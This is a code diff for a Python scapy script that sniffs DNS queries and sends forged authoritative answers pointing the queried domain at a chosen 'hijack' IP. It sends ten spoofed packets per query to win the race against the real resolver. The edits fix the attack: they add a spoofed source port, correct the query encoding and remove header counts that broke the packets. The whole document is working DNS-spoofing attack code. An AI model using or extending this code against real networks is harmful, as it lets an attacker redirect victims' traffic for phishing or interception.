@@ -43,7 +43,8 @@ def process_packet(packet):
 
         # Filter for DNS queries (qr == 0 means it's a query, not a response)
         if dns_layer.qr == 0:
-            query = dns_layer.qd.qname.decode('utf-8')
+            print(dns_layer.qd)
+            query = dns_layer.qd.qname.decode()
 
             # Check if the queried domain matches any in the hostname file or if we should use the default
             hijack_ip = get_hijack_ip(query)
@@ -77,7 +78,7 @@ def handle_dns_response(txid, query, hijack_ip, src_ip, src_port, dst_ip, dst_po
 
     # Send multiple forged DNS packets to increase chances of winning the race condition
     for _ in range(10):  # Increase this number to flood the resolver with guesses
-        send_packet(src_ip=dst_ip, dst_ip=src_ip, dst_port=src_port, payload=forged_payload)
+        send_packet(src_ip=dst_ip, src_port=dst_port, dst_ip=src_ip, dst_port=src_port, payload=forged_payload)
         
         
 def extract_domain(query):
@@ -103,14 +104,10 @@ def dns_payload(txid, query, hijack_ip):
         qr=1,  # qr = 1 means this is a response
         aa=1,  # Authoritative answer
         ra=1,  # Recursion Available
-        qdcount=1,
-        ancount=1,
-        nscount=1,
-        arcount=1
     )
 
     # Add the original query in the Question Section
-    payload.qd = scapy.DNSQR(qname=query, qtype="A", qclass="IN")
+    payload.qd = scapy.DNSQR(qname=query.encode(), qtype="A", qclass="IN")
 
     payload.an = scapy.DNSRR(rrname=query, type="A", ttl=86400, rdata=hijack_ip)
 
@@ -124,12 +121,13 @@ def dns_payload(txid, query, hijack_ip):
 
 
 # Function to send the forged DNS packet
-def send_packet(src_ip, dst_ip, dst_port, payload):
+def send_packet(src_ip, src_port ,dst_ip, dst_port, payload):
     """
     Sends a forged DNS packet back to the client.
     """
+
     ip_packet = scapy.IP(src=src_ip, dst=dst_ip)
-    udp_segment = scapy.UDP(dport=dst_port)
+    udp_segment = scapy.UDP(dport=dst_port, sport = src_port)
     final_packet = ip_packet / udp_segment / payload
     scapy.send(final_packet, verbose=False)
 
